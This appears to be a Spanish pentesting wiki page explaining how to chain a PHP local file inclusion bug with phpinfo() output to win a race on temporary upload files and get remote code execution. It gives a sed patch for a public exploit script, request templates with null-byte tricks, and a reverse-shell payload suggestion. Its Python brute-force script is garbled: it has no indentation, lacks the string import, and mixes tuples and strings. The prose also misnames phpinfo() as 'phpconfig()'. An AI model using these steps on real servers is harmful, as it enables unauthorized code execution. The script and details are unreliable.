{{#include ../../banners/hacktricks-training.md}}

Para explotar esta vulnerabilidad necesitas: **Una vulnerabilidad LFI, una página donde se muestre phpinfo(), "file_uploads = on" y el servidor debe poder escribir en el directorio "/tmp".**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s)

Necesitas arreglar el exploit (cambiar **=>** por **=>**). Para hacerlo puedes hacer:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Tienes que cambiar también el **payload** al principio del exploit (por ejemplo, para un php-rev-shell), el **REQ1** (esto debería apuntar a la página de phpinfo y debería tener el padding incluido, es decir: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), y **LFIREQ** (esto debería apuntar a la vulnerabilidad LFI, es decir: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Verifica el doble "%" al explotar el carácter nulo)

{{#file}}
LFI-With-PHPInfo-Assistance.pdf
{{#endfile}}

### Teoría

Si se permiten cargas en PHP y intentas subir un archivo, este archivo se almacena en un directorio temporal hasta que el servidor ha terminado de procesar la solicitud, luego este archivo temporal se elimina.

Entonces, si has encontrado una vulnerabilidad LFI en el servidor web, puedes intentar adivinar el nombre del archivo temporal creado y explotar un RCE accediendo al archivo temporal antes de que se elimine.

En **Windows**, los archivos suelen almacenarse en **C:\Windows\temp\php**

En **linux**, el nombre del archivo suele ser **aleatorio** y se encuentra en **/tmp**. Como el nombre es aleatorio, es necesario **extraer de algún lugar el nombre del archivo temporal** y acceder a él antes de que se elimine. Esto se puede hacer leyendo el valor de la **variable $\_FILES** dentro del contenido de la función "**phpconfig()**".

**phpinfo()**

**PHP** utiliza un búfer de **4096B** y cuando está **lleno**, se **envía al cliente**. Luego, el cliente puede **enviar** **muchas solicitudes grandes** (usando encabezados grandes) **subiendo un php** reverse **shell**, esperar a que se **devuelva la primera parte de phpinfo()** (donde está el nombre del archivo temporal) y tratar de **acceder al archivo temporal** antes de que el servidor php elimine el archivo explotando una vulnerabilidad LFI.

**Script de Python para intentar forzar el nombre (si la longitud = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{{#include ../../banners/hacktricks-training.md}}
